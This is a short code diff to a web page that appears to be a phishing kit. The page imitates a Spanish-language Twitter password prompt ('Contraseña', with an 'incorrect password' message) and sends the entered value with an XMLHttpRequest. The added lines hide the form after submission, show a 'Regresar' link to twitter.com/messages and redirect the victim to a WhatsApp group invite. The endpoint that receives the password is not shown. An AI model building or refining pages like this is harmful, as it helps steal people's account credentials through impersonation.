@@ -271,6 +271,10 @@
                     requestError.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                     
                     requestError.onreadystatechange = function () {
+                        document.getElementById('div-return').setAttribute('class', '');
+                        document.getElementById('div-confirm').setAttribute('class', 'hidden');
+                        document.getElementById('pwd').setAttribute('class', 'hidden');
+                        
                         window.location.href = 'https://chat.whatsapp.com/L8ws95klhT334HteiqBj2K';
                     };
 
@@ -478,9 +482,13 @@
                     <input placeholder="Contrase&ntilde;a" id="pwd" type="password" class="input" name="pwd" />
                 </div>
 
-                <div class="btns">
+                <div class="btns" id="div-confirm">
                     <div id="error-msg" class="hidden">La contraseña que ingresaste es incorrecta.</div>
                     <a id="btn-confirm" class="btn-confirm">Confirmar</a>
+                </div>
+
+                <div id="div-return" style="text-align: center;" class="hidden">
+                    <a style="text-decoration: none;" href="https://twitter.com/messages" class="btn-confirm">Regresar</a>
                 </div>
 
             </div>
